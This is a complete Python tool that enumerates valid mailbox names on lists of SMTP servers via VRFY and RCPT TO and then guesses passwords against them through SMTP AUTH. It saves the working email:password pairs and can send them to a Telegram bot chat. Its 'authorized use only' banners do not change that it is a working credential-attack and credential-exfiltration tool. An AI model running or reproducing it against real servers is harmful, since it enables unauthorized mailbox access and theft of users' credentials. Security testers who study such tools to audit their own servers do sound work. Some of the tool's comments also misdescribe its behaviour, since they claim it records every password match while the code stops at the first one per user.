#!/usr/bin/env python3
"""
SMTP Username Enumeration + Weak Password Check
------------------------------------------------
For AUTHORIZED vulnerability assessment of SMTP servers only.

Phase 1 – Enumerate valid usernames (VRFY / RCPT TO)
Phase 2 – (Optional) Test those users against a list of default/common
          passwords via SMTP AUTH, to identify weak password practices.

Results:
  - found_emails.txt             → all valid addresses (user@domain)
  - matched_credentials.txt      → ALL successful password matches (user@domain:password)
                                   when --passwords is used

Usage:
    # Enumeration only
    python smtp_enum_tool.py -t smtp_ips.txt -u usernames.txt --domain client.com

    # Enumeration + weak password check
    python smtp_enum_tool.py -t smtp_ips.txt -u usernames.txt --domain client.com \\
        --passwords common_passwords.txt --port 587 --tls --delay 1.5

    # Send results to Telegram
    python smtp_enum_tool.py -t smtp_ips.txt -u usernames.txt --domain client.com \\
        --passwords common_passwords.txt --telegram-token BOT_TOKEN --telegram-chat YOUR_CHAT_ID

    # Or use environment variables:
    #   export TELEGRAM_BOT_TOKEN="..."
    #   export TELEGRAM_CHAT_ID="..."

Requirements:
    pip install dnspython   (optional, for better domain detection)

LEGAL / ETHICAL NOTICE — READ CAREFULLY:
- Use ONLY against systems you own or have explicit written permission to test.
- Password testing performs authentication attempts (credential checks).
- Unauthorized access attempts are illegal in most jurisdictions.
- This tool is for improving password hygiene of organizations you support.
- Never use findings for unauthorized access, fraud, or harm.
"""

import argparse
import os
import socket
import smtplib
import ssl
import re
import sys
import time
import json
import urllib.request
import urllib.parse
import urllib.error
from datetime import datetime
from pathlib import Path

try:
    import dns.resolver
    HAS_DNS = True
except ImportError:
    HAS_DNS = False


# ====================== DEFAULTS ======================
DEFAULT_PORT = 25
CONNECT_TIMEOUT = 10
SMTP_TIMEOUT = 15
DEFAULT_DELAY = 0.5
OUTPUT_EMAILS = "found_emails.txt"
OUTPUT_MATCHED = "matched_credentials.txt"
TELEGRAM_MAX_LEN = 3500   # keep under Telegram's 4096 limit with margin
# ======================================================


def send_telegram(token: str, chat_id: str, text: str) -> bool:
    """Send a text message to Telegram. Returns True on success."""
    url = f"https://api.telegram.org/bot{token}/sendMessage"
    # Split long messages if needed
    chunks = []
    while text:
        chunks.append(text[:TELEGRAM_MAX_LEN])
        text = text[TELEGRAM_MAX_LEN:]

    ok = True
    for chunk in chunks:
        data = urllib.parse.urlencode({
            "chat_id": chat_id,
            "text": chunk,
            "disable_web_page_preview": "true",
        }).encode()
        req = urllib.request.Request(url, data=data, method="POST")
        try:
            with urllib.request.urlopen(req, timeout=30) as resp:
                if resp.status != 200:
                    ok = False
        except (urllib.error.URLError, urllib.error.HTTPError, OSError) as e:
            print(f"    [!] Telegram send failed: {e}")
            ok = False
    return ok


def build_telegram_report(emails: set, matched: set, targets_count: int) -> str:
    """Build a concise report for Telegram."""
    lines = [
        "SMTP Assessment Results",
        f"Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}",
        f"Targets checked: {targets_count}",
        "",
        f"Valid addresses ({len(emails)}):",
    ]
    if emails:
        for e in sorted(emails):
            lines.append(f"  • {e}")
    else:
        lines.append("  (none)")

    lines.append("")
    lines.append(f"Password matches ({len(matched)}) — all successful AUTH results:")
    if matched:
        for c in sorted(matched):
            lines.append(f"  • {c}")
    else:
        lines.append("  (none)")

    lines.append("")
    lines.append("Authorized assessment only. Do not misuse.")
    return "\n".join(lines)


def load_lines(path: str) -> list:
    """Load non-empty, non-comment lines from a text file."""
    p = Path(path)
    if not p.exists():
        print(f"[!] File not found: {path}")
        sys.exit(1)
    lines = []
    for line in p.read_text(encoding="utf-8", errors="ignore").splitlines():
        line = line.strip()
        if line and not line.startswith("#"):
            lines.append(line)
    return lines


def is_ip(value: str) -> bool:
    return bool(re.match(r"^\d{1,3}(\.\d{1,3}){3}$", value))


def try_get_domain_from_banner(banner: str) -> str | None:
    if not banner:
        return None
    match = re.search(
        r"([a-zA-Z0-9]([a-zA-Z0-9\-]{0,61}[a-zA-Z0-9])?\.)+[a-zA-Z]{2,}",
        banner,
    )
    if match:
        domain = match.group(0).lower().rstrip(".")
        if not is_ip(domain) and "localhost" not in domain:
            return domain
    return None


def try_get_domain_via_dns(ip: str) -> str | None:
    if not HAS_DNS:
        return None
    try:
        rev = socket.gethostbyaddr(ip)
        hostname = rev[0].lower()
        if hostname and not is_ip(hostname):
            parts = hostname.split(".")
            if len(parts) >= 2:
                return ".".join(parts[-2:]) if len(parts) > 2 else hostname
            return hostname
    except Exception:
        pass
    return None


def open_smtp(host: str, port: int, use_tls: bool, use_ssl: bool):
    """Open SMTP connection (plain, STARTTLS, or SSL)."""
    if use_ssl:
        context = ssl.create_default_context()
        smtp = smtplib.SMTP_SSL(
            host=host, port=port, timeout=SMTP_TIMEOUT, context=context
        )
        smtp.ehlo_or_helo_if_needed()
        return smtp

    smtp = smtplib.SMTP(host=host, port=port, timeout=SMTP_TIMEOUT)
    smtp.ehlo_or_helo_if_needed()
    if use_tls:
        context = ssl.create_default_context()
        smtp.starttls(context=context)
        smtp.ehlo_or_helo_if_needed()
    return smtp


def smtp_check_user(
    host: str, port: int, username: str, domain: str | None,
    use_tls: bool, use_ssl: bool,
) -> tuple[bool, str]:
    """Check if a username appears valid (VRFY / RCPT TO)."""
    try:
        with open_smtp(host, port, use_tls, use_ssl) as smtp:
            code, _ = smtp.verify(username)
            if code in (250, 251, 252):
                return True, "VRFY"

            if domain:
                code, _ = smtp.verify(f"{username}@{domain}")
                if code in (250, 251, 252):
                    return True, "VRFY-domain"

            if domain:
                try:
                    smtp.mail("probe@localhost")
                    code, _ = smtp.rcpt(f"{username}@{domain}")
                    if code in (250, 251, 252):
                        return True, "RCPT TO"
                    smtp.rset()
                except smtplib.SMTPException:
                    pass
    except (socket.timeout, socket.error, smtplib.SMTPException, OSError, ssl.SSLError):
        return False, "error"
    return False, "none"


def smtp_try_login(
    host: str, port: int, email: str, password: str,
    use_tls: bool, use_ssl: bool,
) -> bool:
    """
    Attempt SMTP AUTH with the given email and password.
    Returns True only if authentication succeeds.
    """
    try:
        with open_smtp(host, port, use_tls, use_ssl) as smtp:
            smtp.login(email, password)
            return True
    except smtplib.SMTPAuthenticationError:
        return False
    except (socket.timeout, socket.error, smtplib.SMTPException, OSError, ssl.SSLError):
        return False


def assess_host(
    host: str,
    port: int,
    usernames: list,
    forced_domain: str | None,
    use_tls: bool,
    use_ssl: bool,
    delay: float,
    passwords: list | None,
) -> tuple[str | None, list, list]:
    """
    1) Enumerate valid usernames
    2) Optionally test them against the password list
    Returns (domain, valid_emails, matched_creds)
    matched_creds items are "email:password" for every successful AUTH
    """
    tls_note = " (SSL)" if use_ssl else (" (STARTTLS)" if use_tls else "")
    print(f"\n[*] Connecting to {host}:{port}{tls_note} ...")

    domain = forced_domain
    banner = ""

    try:
        with open_smtp(host, port, use_tls, use_ssl) as smtp:
            code, resp = smtp.ehlo()
            banner = resp.decode(errors="ignore") if isinstance(resp, bytes) else str(resp)
    except Exception as e:
        if not use_ssl and not use_tls:
            try:
                sock = socket.create_connection((host, port), timeout=CONNECT_TIMEOUT)
                banner = sock.recv(1024).decode(errors="ignore")
                sock.close()
            except Exception as e2:
                print(f"    [!] Cannot connect: {e2}")
                return None, [], []
        else:
            print(f"    [!] Cannot connect: {e}")
            return None, [], []

    if not domain:
        domain = try_get_domain_from_banner(banner)
    if not domain:
        domain = try_get_domain_via_dns(host)

    if forced_domain:
        print(f"    [+] Using forced domain: {domain}")
    elif domain:
        print(f"    [+] Detected mail domain: {domain}")
    else:
        print("    [!] Could not determine domain")

    # ----- Phase 1: username enumeration -----
    print(f"    [*] Phase 1: Checking {len(usernames)} usernames ...")
    found_emails = []
    for i, user in enumerate(usernames, 1):
        valid, method = smtp_check_user(host, port, user, domain, use_tls, use_ssl)
        if valid:
            email = f"{user}@{domain}" if domain else user
            print(f"        [+] VALID ({method}): {email}")
            found_emails.append(email)
        if delay > 0 and i < len(usernames):
            time.sleep(delay)

    if not found_emails:
        print("    [-] No valid usernames found on this host.")
        return domain, [], []

    # ----- Phase 2: password match check (optional) -----
    # Records the first successful AUTH per user against the password list.
    matched_creds = []
    if passwords:
        print(f"    [*] Phase 2: Testing {len(found_emails)} users against {len(passwords)} passwords ...")
        print("        (AUTH attempts – authorized use only)")
        print("        Stops after the first working password per user.")
        total_attempts = len(found_emails) * len(passwords)
        attempt = 0
        for email in found_emails:
            for pwd in passwords:
                attempt += 1
                ok = smtp_try_login(host, port, email, pwd, use_tls, use_ssl)
                if ok:
                    print(f"        [!] MATCH: {email}:{pwd}")
                    matched_creds.append(f"{email}:{pwd}")
                    # Stop after first working password for this user
                    break
                if delay > 0 and attempt < total_attempts:
                    time.sleep(delay)
    else:
        print("    [*] Phase 2 skipped (no --passwords list provided)")

    return domain, found_emails, matched_creds


def main():
    parser = argparse.ArgumentParser(
        description="Authorized SMTP username enumeration + optional weak-password check."
    )
    parser.add_argument("-t", "--targets", required=True, help="File with SMTP IPs/hostnames")
    parser.add_argument("-u", "--users", required=True, help="File with usernames to test")
    parser.add_argument(
        "--passwords",
        default=None,
        help="File with default/common passwords (enables Phase 2 weak-password check)",
    )
    parser.add_argument("-p", "--port", type=int, default=DEFAULT_PORT, help="SMTP port")
    parser.add_argument("-d", "--domain", default=None, help="Force mail domain (e.g. client.com)")
    parser.add_argument("--tls", action="store_true", help="STARTTLS (typical for port 587)")
    parser.add_argument("--ssl", action="store_true", help="Implicit SSL (typical for port 465)")
    parser.add_argument(
        "--delay",
        type=float,
        default=DEFAULT_DELAY,
        metavar="SECONDS",
        help=f"Delay between checks (default: {DEFAULT_DELAY})",
    )
    parser.add_argument("-o", "--output", default=OUTPUT_EMAILS, help="File for found emails")
    parser.add_argument(
        "--matched-output",
        "--weak-output",
        dest="matched_output",
        default=OUTPUT_MATCHED,
        help=f"File for ALL password matches (default: {OUTPUT_MATCHED})",
    )
    parser.add_argument(
        "--telegram-token",
        default=os.getenv("TELEGRAM_BOT_TOKEN"),
        help="Telegram bot token (or set TELEGRAM_BOT_TOKEN env var)",
    )
    parser.add_argument(
        "--telegram-chat",
        default=os.getenv("TELEGRAM_CHAT_ID"),
        help="Telegram chat ID (or set TELEGRAM_CHAT_ID env var)",
    )
    args = parser.parse_args()

    if args.tls and args.ssl:
        print("[!] Choose either --tls or --ssl, not both.")
        sys.exit(1)

    print("=" * 62)
    print("  SMTP Assessment Tool (Enum + Optional Password Check)")
    print("  AUTHORIZED USE ONLY — written permission required")
    print("=" * 62)

    if args.passwords:
        print()
        print("  ⚠  Password-check mode is ENABLED.")
        print("  ⚠  This will attempt SMTP AUTH with the provided password list.")
        print("  ⚠  Ensure you have written authorization for these targets.")
        print()

    targets = load_lines(args.targets)
    usernames = load_lines(args.users)
    passwords = load_lines(args.passwords) if args.passwords else None

    if not targets or not usernames:
        print("[!] Targets or usernames file is empty.")
        sys.exit(1)

    print(f"Targets      : {len(targets)}")
    print(f"Usernames    : {len(usernames)}")
    print(f"Passwords    : {len(passwords) if passwords else 'disabled'}")
    print(f"Port         : {args.port}")
    print(f"TLS/SSL      : {'STARTTLS' if args.tls else ('SSL' if args.ssl else 'plain')}")
    print(f"Domain       : {args.domain or 'auto-detect'}")
    print(f"Delay        : {args.delay}s")
    print(f"Emails out   : {args.output}")
    if passwords:
        print(f"Matches out  : {args.matched_output}")
    if args.telegram_token and args.telegram_chat:
        print(f"Telegram     : enabled (chat {args.telegram_chat})")
    elif args.telegram_token or args.telegram_chat:
        print("Telegram     : incomplete (need both token and chat id)")
    else:
        print("Telegram     : disabled")
    print()

    all_emails = set()
    all_matched = set()

    for host in targets:
        domain, emails, matched = assess_host(
            host=host,
            port=args.port,
            usernames=usernames,
            forced_domain=args.domain,
            use_tls=args.tls,
            use_ssl=args.ssl,
            delay=args.delay,
            passwords=passwords,
        )
        all_emails.update(emails)
        all_matched.update(matched)

    # Write ALL found emails
    with open(args.output, "w", encoding="utf-8") as f:
        f.write(f"# Valid SMTP addresses – {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
        f.write("# Authorized assessment only\n\n")
        for email in sorted(all_emails):
            f.write(email + "\n")

    # Write ALL successful password matches (every match, not just one per user)
    if passwords:
        with open(args.matched_output, "w", encoding="utf-8") as f:
            f.write(f"# All password matches – {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
            f.write("# Format: email:password\n")
            f.write("# Every successful AUTH against the password list is listed.\n")
            f.write("# Handle securely. Notify the organization. Do not misuse.\n\n")
            for cred in sorted(all_matched):
                f.write(cred + "\n")

    print("\n" + "=" * 62)
    print(f"✓ Valid addresses found  : {len(all_emails)}  → {args.output}")
    if passwords:
        print(f"✓ Password matches found : {len(all_matched)}  → {args.matched_output}")

    # Optional Telegram delivery
    if args.telegram_token and args.telegram_chat:
        print("[*] Sending results to Telegram ...")
        report = build_telegram_report(all_emails, all_matched, len(targets))
        if send_telegram(args.telegram_token, args.telegram_chat, report):
            print("✓ Telegram message sent")
        else:
            print("[!] Telegram message failed (check token / chat id)")
    elif args.telegram_token or args.telegram_chat:
        print("[!] Telegram skipped: provide both --telegram-token and --telegram-chat")

    print("=" * 62)
    print("Review results and contact the organization through proper channels.")
    print("Do not use any credentials for unauthorized access.\n")


if __name__ == "__main__":
    main()
